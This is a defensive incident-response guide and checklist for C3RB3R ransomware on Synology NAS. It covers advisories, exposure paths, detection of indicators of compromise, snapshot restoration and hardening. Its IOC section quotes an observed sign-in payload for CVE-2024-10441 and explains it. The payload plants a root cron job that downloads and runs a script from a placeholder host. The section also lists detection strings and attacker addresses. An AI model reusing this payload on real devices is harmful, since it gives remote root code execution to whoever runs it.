# C3RB3R / `.L0CK3D` ransomware against Synology NAS

Public facts and a response checklist. Advisory details below are from Synology's published advisories; check the advisory pages for revisions after this was written.

## The campaign

- In late October 2026 many internet-exposed Synology NAS were encrypted within a short time. Encrypted files get the extension `.L0CK3D` (with a zero; `.LOCK3D` also reported) and every affected folder gets a ransom note `read-me3.txt` titled "C3RB3R INSTRUCTIONS". Forum reports describe the encryptor as derived from leaked Conti v3 code.
- Public reports tie the intrusions to the two vulnerabilities fixed in **Synology-SA-26:13**: unauthenticated remote arbitrary file read/write in DSM (CVSS 9.8). Boxes whose DSM web interface was reachable from the internet were the ones hit.
- Exposed boxes also see continuous dictionary sign-in attempts (account names such as `admin`, `backup`, `sync`) from hundreds of addresses. DSM's connection log keeps roughly the last 10,000 entries, so at that rate the history of earlier days is gone within hours.

## Advisories

### Synology-SA-26:13 (published 2026-09-18)

CVE-2026-13639 and CVE-2026-13684, DSM. Fixed builds:

| DSM branch | Fixed in |
|---|---|
| 7.4 | 7.4-90075 and later |
| 7.3.2 | 7.3.2-86009 Update 4 |
| 7.2.2 | 7.2.2-72806 Update 9 |
| 7.2.1 | 7.2.1-69057 Update 12 |
| 7.1 and older | not listed: no fix for these branches; upgrade to a fixed branch |

https://www.synology.com/en-global/security/advisory/Synology_SA_26_13

### Synology-SA-26:14 "PHP2Shell" (published 2026-10-22, revised 2026-10-26)

Packages: Calendar (fixed 3.0.4-21435), MailStation (30000002.3.19-20333), PHP 7.3 (no fix, end of life: uninstall), PHP 7.4 (7.4.33-0131), PHP 8.0 (8.0.30-0122), PHP 8.1 (8.1.34-0120), PHP 8.2 (8.2.35-0171), PHP 8.3 (8.3.36-0051), PHP 8.4 (8.4.27-0051).

https://www.synology.com/en-global/security/advisory/Synology_SA_26_14

CVE-2024-10441 (an older DSM remote code execution flaw) has also been reported in attacks on Synology devices; it has its own advisory and fixed builds. Staying on the newest build offered for your model covers both.

## How a NAS ends up reachable from the internet

- Router port forwards to 5000/5001 (DSM), 443/80 (Web Station, reverse proxy), 445 (SMB), 21 (FTP), and others.
- DSM's own UPnP/NAT-PMP router configuration (Control Panel > External Access > Router Configuration) and QuickConnect's automatic port forwarding create those forwards for you.
- QuickConnect's relay reaches the DSM sign-in page even with no port forward at all.
- The NAS dials PPPoE itself or sits in the router's DMZ: it then holds a public IPv4 address with no NAT in front, and every service listens on it unless DSM's firewall drops it.
- IPv6: a global IPv6 address on the NAS is reachable unless a firewall (router or DSM) drops inbound traffic.

## Indicators of compromise and how `nas incident --deep` checks them

Observed in the wild (2026-10-28): CVE-2024-10441 (Synology-SA-24:20, output-encoding flaw in the system plugin daemon) used through the DSM sign-in. The request is `SYNO.API.Auth` v7 `login` with this account field (newlines and tabs are real characters):

```
admin
PLUGIN_VALUE_END
LD_PRELOAD=PLUGIN_VALUE_START
NOP
*	*	*	*	*	root	echo	<base64 of "curl -s http://<IP>/xdy5.sh|sh">	|base64	-d|sh
NOP
PLUGIN_VALUE_END
LD_DEBUG=libs
LD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>
ESCAPE=PLUGIN_VALUE_START
NOP
```

The injected variables reach a plugin process; glibc's `LD_DEBUG` output, which contains the cron line, is written to `/etc/cron.d/synot<xxx>`, and cron then downloads and runs `xdy5.sh` as root every minute. Builds fixed for SA-24:20 are not affected by this request.

| Indicator | Where | Item |
|---|---|---|
| `PLUGIN_VALUE_END`, `LD_PRELOAD=`, `LD_DEBUG_OUTPUT` in a sign-in | DSM connection log (`SYNO.Core.SyslogClient.Log`, about the last 10,000 entries) | `exploit_attempts` (normal session) |
| The same strings, `POST weblogin Args: USER=...` with the payload | `/var/log/synoplugin.log*` (root only, rotated as `.xz`) | `exploit_attempts_logs` (`--deep`) |
| "failed to sign in" event text with the payload | `/var/log/synoscgi.log*` (root only, `.xz`) | `exploit_attempts_logs` |
| `authentication failure ... rhost=<IP>` without a `user=` field | `/var/log/auth.log*` (root only) | `exploit_attempts_logs` |
| Source addresses `46.8.78.122`, `104.253.175.125` (`incident.ioc_ips`, extendable) | all of the above, connections | `exploit_attempts`, `exploit_attempts_logs`, `ioc_processes` |
| `/etc/cron.d/synot*`, cron lines with `base64 -d`, `| sh`, `curl`/`wget`, `xdy5` | `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron` | `ioc_cron` |
| `/bin/libgld`, `/bin/qnetd`, `/bin/l0ck.enc`, any `xdy5*` file | `/bin`, `/usr/bin`, temp folders, `/etc`, `/root`, `/var/spool` (3 levels) | `ioc_binaries` |
| A second uid 0 account; unknown accounts with uid >= 1024 | `/etc/passwd` (package accounts and `incident.allowed_users` excluded) | `ioc_users` |
| `authorized_keys` for root or any home | `/root/.ssh`, `/var/services/homes/*/.ssh`, `/volume*/homes/*/.ssh` | `ioc_ssh_keys` |
| Processes named `libgld`/`qnetd`/`xdy5*` or running from `/tmp`, `/var/tmp`, `/dev/shm`; executables outside Synology paths; established TCP connections to public addresses (reported), to IOC addresses (FAIL) | `/proc` | `ioc_processes` |

Verdicts: known-bad hit = FAIL; unknown entries (cron lines outside Synology paths, accounts not allow-listed, executables outside Synology paths, `(deleted)` executables, any `authorized_keys`) = WARN; attempts in logs = WARN with "attempt seen". Container processes are counted, not judged. Log text is shown as data: control characters escaped, lengths capped; `--json` adds the collector's raw result under `deep`.

How `--deep` runs:

- `--backend password`: a temporary root task in Task Scheduler (`SYNO.Core.TaskScheduler.Root create` after `SYNO.Core.User.PasswordConfirm`, `run` v2, deleted afterwards) runs one Python script (zlib + base64 in the task script). It refuses a symlinked `deploy.stage_dir`, writes one file `<stage_dir>/nas-deep-<random>.json` with `O_CREAT|O_EXCL|O_NOFOLLOW`, carrying the random marker; the CLI reads it with File Station, checks the marker and deletes it. `deploy.stage_dir` must be set (a folder in a shared folder the account can write; created if missing).
- `--backend local` (on the NAS as root): the same script runs directly and prints the JSON.
- Nothing else is written; the script only reads.

Equivalent by hand (as root): `xzcat -f /var/log/synoplugin.log* /var/log/synoscgi.log* /var/log/auth.log* | grep -E 'PLUGIN_VALUE_END|LD_DEBUG_OUTPUT|46\.8\.78\.122|104\.253\.175\.125'`, `ls -la /etc/cron.d /bin/libgld /bin/qnetd /bin/l0ck.enc`, `awk -F: '$3>=1024 || ($3==0 && $1!="root")' /etc/passwd`, `ls -la /root/.ssh /var/services/homes/*/.ssh`, `ls -l /proc/*/exe`, `cat /proc/net/tcp`.

## Checklist

### 1. Isolate (if anything looks encrypted)

- Cut the internet path first: disable router port forwards, `nas incident fix --only quickconnect,router_port_forwarding`, or physically disconnect the WAN side. Keep a LAN path if you need to investigate.
- Disconnecting the network stops remote control. Shutting the NAS down stops a running encryption process, but loses what is only in memory and running tasks you might want to inspect.
- Disconnect computers that mount the NAS shares; a compromised client can keep encrypting through SMB.

### 2. Keep evidence

- Leave the ransom notes and a few encrypted files in place (copies are fine). They identify the variant and are needed for any decryptor.
- Export logs: Log Center (日誌中心) > export, and `nas --json logs --limit 20000 > logs.json`, `nas --json inventory > inventory.json` (users, scheduled tasks, packages, containers).
- Write down times: first encrypted file (file modification times), last good snapshot, sign-ins from unknown addresses.

### 3. Assess

```bash
nas incident --scan --probe          # everything, including the ransom-note search and a public port probe
nas logs --since "YYYY-MM-DD HH:MM"  # failed and external successful sign-ins
nas inventory                        # unknown users, admin group members, scheduled tasks, packages, containers
```

Look for: accounts you did not create (and members of `administrators`), Task Scheduler entries you did not create (especially root scripts), packages or containers you did not install, successful sign-ins from addresses you do not recognise, SSH/Telnet turned on.

### 4. Restore from snapshots

Btrfs snapshots are read-only, so an encryptor working through shares cannot change them; an attacker with administrator rights can delete them unless they are immutable (WORM), which not every model supports.

- Find the last snapshot before the encryption: Snapshot Replication > Snapshots > select the shared folder (Snapshot Replication > 快照). Snapshot names are the NAS's local time (`GMT+01-2026.10.30-03.30.01`). With "Make snapshot visible" on, File Station shows them read-only under `#snapshot` in the share, so you can open files before restoring.
- Whole share: select the snapshot > Restore to this snapshot. Everything in the share returns to that point; later changes are lost, so copy anything newer that is still clean first.
- Single files or folders: copy them out of `#snapshot` (File Station or SMB), or Snapshot Replication > Browse > Restore.
- Hyper Backup / Cloud Sync / USB copies: restore with Hyper Backup's Restore > Data (資料), choosing a version from before the encryption. A two-way sync target (Cloud Sync, Drive ShareSync) may already hold the encrypted copies.
- After restoring, run `nas incident --scan` again.

### 5. Patch and harden

```bash
nas incident fix --dry-run           # read the plan first
nas incident fix --ransom-scan --upgrade --rotate-password --yes   # snapshot fixes need the clean scan
```

Then by hand: change the password of every other administrator and of service accounts, turn on 2-step verification for administrators (Control Panel > Security > Account / 控制台 > 安全性 > 帳號), remove unknown accounts, tasks and packages, and only expose services through a VPN (Tailscale package, WireGuard, OpenVPN) rather than port forwards.

Make sure snapshots keep being taken: `nas incident` checks every share for a schedule, a recent scheduled snapshot, and the immutable-snapshot trap (on models without WORM support, turning the lock on through the API is accepted and scheduled snapshots then stop without any log entry).

### 6. Decryption

Check https://www.nomoreransom.org for a decryptor before anything else; keep the encrypted files and notes until you know.

## Background reading

- https://www.it-connect.tech/c3rb3r-ransomware-is-hitting-synology-nas-devices-how-to-protect-yours/
- https://pbxscience.com/synology-nas-ransomware-alert-c3rb3r-attacks-hit-unpatched-devices-update-dsm-now/
- https://www.bleepingcomputer.com/forums/t/780618/c3rb3r-conti-v3-based-ransomware-lock3d-letter-o-l0ck3d-zero-0/
